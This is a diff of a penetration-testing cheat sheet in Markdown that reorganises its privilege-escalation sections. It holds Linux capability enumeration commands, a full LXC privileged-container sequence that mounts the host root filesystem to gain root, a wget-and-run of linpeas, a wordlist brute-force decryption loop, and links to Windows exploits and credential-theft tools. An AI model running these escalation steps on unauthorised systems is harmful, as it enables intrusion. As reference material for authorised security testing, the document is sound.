@@ -2681,7 +2681,8 @@ john --wordlist=<PASSWORDS_LIST> hash.txt
 | `file GZIP.gzip`                                                                                             | Uses the Linux-based file tool to gather file format information.                                                                              |
 | `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done`  | Script that runs a for-loop to extract files from an archive.                                                                                  |
 
-## Priv Esc
+
+# Privilige Escalation 
 
 ## Linux
 
@@ -2733,6 +2734,60 @@ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_li
 chmod +x linpeas_linux_amd64
 ./linpeas_linux_amd64
 ```
+
+### Capabilities 
+
+[Tbhhaxor Exploiting Linux Capabilities Part 1](https://tbhaxor.com/exploiting-linux-capabilities-part-1/)
+
+[Tbhhaxor Exploiting Linux Capabilities Part 2](https://tbhaxor.com/exploiting-linux-capabilities-part-2/)
+
+[SteflanSecurity on Capabilities Exploitation](https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/)
+
+[HackTricks on Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#linux-capabilities)
+
+Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted
+
+
+
+| **Command** | **Description** |
+| --- | --- |
+| `LINPEAS WILL HIGHLIGHT EXPLOITABLE CAPABILITIES` | |
+| `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; ` | Find applications with capabilities set within specific path |
+| `getcap -r / 2>/dev/null` | Find applications with set recursive |
+
+
+| **Capability** | **Description** |
+| --- | --- |
+| `cap_sys_admin` | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings. |
+| `cap_sys_chroot` | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible. |
+| `cap_sys_ptrace` | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
+| `cap_sys_nice` | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted. |
+| `cap_sys_time` | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways. |
+| `cap_sys_resource` | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated. |
+| `cap_sys_module` | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information. |
+| `cap_net_bind_service` | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions. |
+
+Some Capabilities can be used to escalated privilege 
+
+| **Capability** | **Desciption** |
+| --- | --- |
+| `cap_setuid` | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user. |
+| `cap_setgid` | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group. |
+| `cap_sys_admin` | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
+| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks. |
+
+
+
+### Linux Containers 
+
+| **Commands**| **Description** | 
+| --- | --- |
+| `lxc image import PATH --alias ALIAS` | Import image file. Replace PATH with location and Alias with easy to use name |
+| `lxc image list` | list imported image files |
+| `lxc init ALIAS privesc -c security.privileged=true` | Initiate image. security.privileged disables all isolation features allowing to act on the host|
+| `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true` | Configure device. Source is source of container. Path is mount location |
+| `lxc start privesc` | Start container |
+| `lxc exec privesc /bin/bash ` | Log into container |
 
 ### DirtyPipe
 
@@ -2932,7 +2987,24 @@ apt update hooking (PreInvoke)
 | `sudo python2.7 windows-exploit-suggester.py --update` | Update Windows Exploit Suggester database |
 | `python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt` | Running Windows Exploit Suggester |
 
+### Useful tools 
+
+| **Tool** | **Description** |
+| --- | --- |
+| [Seatbelt](https://github.com/GhostPack/Seatbelt) | C# project for performing a wide variety of local privilege escalation checks |
+| [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) | WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained [here](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) |
+| [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) | PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found |
+| [SharpUp](https://github.com/GhostPack/SharpUp) | C# version of PowerUp |
+| [JAWS](https://github.com/411Hall/JAWS) | PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0 |
+| [SessionGopher](https://github.com/Arvanaghi/SessionGopher) | SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information |
+| [Watson](https://github.com/rasta-mouse/Watson) | Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities. |
+| [LaZagne](https://github.com/AlessandroZ/LaZagne) | Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more |
+| [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng) | WES-NG is a tool based on the output of Windows' `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10, including their Windows Server counterparts, is supported |
+| [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) | We will use several tools from Sysinternals in our enumeration including [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk), [PipeList](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist), and [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) |
+
 ### Enumeration scripts
+
+
 
 ### General scans
 
@@ -4720,71 +4792,18 @@ Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword
 | [ACLight](https://github.com/cyberark/ACLight)               | Advanced Discovery of Privileged Accounts        |
 | [ADRecon](https://github.com/sense-of-security/ADRecon)      | Detailed Active Directory Recon Tool             |
 
-## Local Privilege Escalation
+### Local Privilege Escalation
 
-| **Commands**                                                                                                                                                                                            | **Description**                                                                                                                                                |
-| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| [Windows Privilege Escalation CheatSheet (https://github.com/nickvourd/Windows_Privilege_Escalation_CheatSheet)                                                                                         | Cheat Sheet for Windows Local Privilege Escalations                                                                                                            |
-| [Juicy Potato](https://github.com/ohpe/juicy-potato)                                                                                                                                                    | Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803 |
-| [Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato)                                                                                                                                              | Automated Juicy Potato :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803                                                          |
-| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)                                                                                                                                                   | Exploit the PrinterBug for System Impersonation :pray: Works for Windows Server 2019 and Windows 10                                                            |
-| [RoguePotato](https://github.com/antonioCoco/RoguePotato)                                                                                                                                               | Upgraded Juicy Potato :pray: Works for Windows Server 2019 and Windows 10                                                                                      |
-| [Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)                                                                    |                                                                                                                                                                |
-| [SMBGhost CVE-2020-0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/) [PoC](https://github.com/danigargu/CVE-2020-0796) |                                                                                                                                                                |
-| [CVE-2021-36934 (HiveNightmare/SeriousSAM)](https://github.com/cube0x0/CVE-2021-36934)                                                                                                                  |                                                                                                                                                                |
-### Capabilities 
-
-[Tbhhaxor Exploiting Linux Capabilities Part 1](https://tbhaxor.com/exploiting-linux-capabilities-part-1/)
-
-[Tbhhaxor Exploiting Linux Capabilities Part 2](https://tbhaxor.com/exploiting-linux-capabilities-part-2/)
-
-[SteflanSecurity on Capabilities Exploitation](https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/)
-
-[HackTricks on Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#linux-capabilities)
-
-Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted
-
-
-
-| **Command** | **Description** |
+| **Tool** | **Description** |
 | --- | --- |
-| `LINPEAS WILL HIGHLIGHT EXPLOITABLE CAPABILITIES` | |
-| `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; ` | Find applications with capabilities set within specific path |
-| `getcap -r / 2>/dev/null` | Find applications with set recursive |
-
-
-| **Capability** | **Description** |
-| --- | --- |
-| `cap_sys_admin` | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings. |
-| `cap_sys_chroot` | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible. |
-| `cap_sys_ptrace` | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
-| `cap_sys_nice` | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted. |
-| `cap_sys_time` | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways. |
-| `cap_sys_resource` | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated. |
-| `cap_sys_module` | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information. |
-| `cap_net_bind_service` | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions. |
-
-Some Capabilities can be used to escalated privilege 
-
-| **Capability** | **Desciption** |
-| --- | --- |
-| `cap_setuid` | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user. |
-| `cap_setgid` | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group. |
-| `cap_sys_admin` | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
-| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks. |
-
-
-
-### Linux Containers 
-
-| **Commands**| **Description** | 
-| --- | --- |
-| `lxc image import PATH --alias ALIAS` | Import image file. Replace PATH with location and Alias with easy to use name |
-| `lxc image list` | list imported image files |
-| `lxc init ALIAS privesc -c security.privileged=true` | Initiate image. security.privileged disables all isolation features allowing to act on the host|
-| `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true` | Configure device. Source is source of container. Path is mount location |
-| `lxc start privesc` | Start container |
-| `lxc exec privesc /bin/bash ` | Log into container |
+| (Windows Privilege Escalation CheatSheet)[https://github.com/nickvourd/Windows_Privilege_Escalation_CheatSheet]| Cheat Sheet for Windows Local Privilege Escalation |
+| (Juicy Potato)[https://github.com/ohpe/juicy-potato]    | Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803 |
+| (Lovely Potato)[https://github.com/TsukiCTF/Lovely-Potato]  | Automated Juicy Potato :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803     |
+| (PrintSpoofer)[https://github.com/itm4n/PrintSpoofer]   | Exploit the PrinterBug for System Impersonation :pray: Works for Windows Server 2019 and Windows 10    |
+| (RoguePotato)[https://github.com/antonioCoco/RoguePotato]     | Upgraded Juicy Potato :pray: Works for Windows Server 2019 and Windows 10    |
+| (Abusing Token Privileges)[https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/]   |    |
+| (SMBGhost CVE-2020-0796)[https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/] |    (PoC)[https://github.com/danigargu/CVE-2020-0796]  |
+| (CVE-2021-36934 (HiveNightmare/SeriousSAM))[https://github.com/cube0x0/CVE-2021-36934]  | | 
 
 ### Useful Local Priv Esc Tools
 
